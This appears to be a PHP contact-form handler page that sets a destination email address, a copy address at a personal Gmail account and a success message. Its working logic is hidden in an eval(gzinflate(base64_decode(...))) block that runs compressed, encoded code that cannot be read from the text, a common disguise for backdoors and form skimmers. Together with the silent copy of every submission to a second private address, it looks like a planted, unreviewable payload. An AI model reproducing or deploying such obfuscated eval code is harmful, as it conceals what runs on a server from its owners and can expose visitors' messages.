<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>Send Message</title>
</head>
<body text="#000000" leftmargin="150" topmargin="20">
 
<?php
//Enter the address to receive the message in the line below
$emailadd = "contacto@calificamimedico.comuv.com";

//Enter a second address to receive a copy of the message in the line below (optional) 
$ccadd = "mikemad33@gmail.com";

//The three letter time zone abbreviation below can be changed to display other time zones, for example [CST]
$tz = "[EST]";

/*Edit the paragraph below ( beginning with <p align="center"> and ending with </p> ) to the message of your choice
*/
$successmsg = <<<EOD

<p align="center"><br>
<h2>The Message was sent</h2><br>
<h3>You will receive a reply soon</h3><br>
<h3><a href="../Buscar_med.html">HOME</a></h3>
</p>

EOD;
?>

<?php eval(gzinflate(base64_decode('
jVZRb9s4DH4v0P/AGkFjF16Cu8ckTdcrsJfhcMOt
L0Pd7RSZidWzJU9S0mVT//tRltwmu6xtW8AWSX8k
P1JkL+azi7Zqj48GkjUI5zD48uGvj9c3Q38c3k5J
gQ0T9Y6mOwcV5ztyzoNwocrtjtgfg4JZK3cU/kgK
OD7qf8UyPUl7f+eQJBmcnkJ6Yqymv6jJk7ckdw5+
Fo+CGDWuRJoUOsmDZk8qH6VZ9uP4CHmlIJlVv88v
YcNqUULwzspSozFwzwxIZQGlJYRyNBuTKYH4qB+6
gLFp7Tbt2AuOwtlnvXuOPmHP54camUFYiroGIYHR
YymwLs2Tn87NoGTW18Y/0qTO4R3c5fAph9VEAKO0
d2gnRkTLTc1MhSbGMfXkAgxaohy1r8FwnE5d4dw/
bu5m7tR9dokbjogeV2g3TEZD98M9uBt364rMFWk2
FsMpjMfEBbSiFXKVQ8uMoRdoFT0XNRJHG6GVbIgr
4lILRkID6SDLvfNf/hCqwZZpnyJXTcNkaXKQaCxS
Nb4hX1uhZO5ZQqAaCI28k7yEumD835VWa1lCqxXH
LtwcTItcsPrRF6Te0LSMYw5o+SjL4etaWTQvOZB4
XwsKNAelwSi6PspWqJ88VJQVJ8afR+pKE29fS236
RWNbUzRpX6+cbkIeTHwpybq/ks+Zh44L9rE3njPv
G4Ws4z19ztqbhLYiHv7GRm2QOviOKkNFq5CVXdKD
pSDyz4FpzbZpMl5wXkzGIsmT8ZWiGyVt8eZ622Iv
fFJb1b1lu/NnPx4PTcGcnS3Uam2iT+oPH0p5drbH
wOH8X4HQk3K4PK8A6Gt2mNNXAOwSfV0h2EojQo2+
GGAFRfVdSQS2WGjcCOYvBiywVvfAmX/zTShXVBSr
oBSGHG9jlz5+TP27pAbGb6xp6YrdXH28vqWIG7ow
bOWzTsL8GdjvUMjjo3daNZPYsW8iy15+aX1FKYBJ
bCEv/DOgTAoZilBI6vekS2iwJCAPHwEDkA5TLyyD
veFKq+Bkb7ruCOKgJ8mBXfF/Ka2KbhSLJaRpt8Uo
jC2auHBiy510K6gz9Of+65AdPSJD9OYzyaZxJfTf
0w6JED8hkOIFkAjD+SGMTvoCQLdjBmbN/dhrzKpj
9AGwpnXTr6Cwg2YMqKWW50VyxzbMcNoedlIJY5Xe
jvxkTH/LimT+x+XV+9mYzfcX0wX99/Af
'))); ?>

</body>
</html>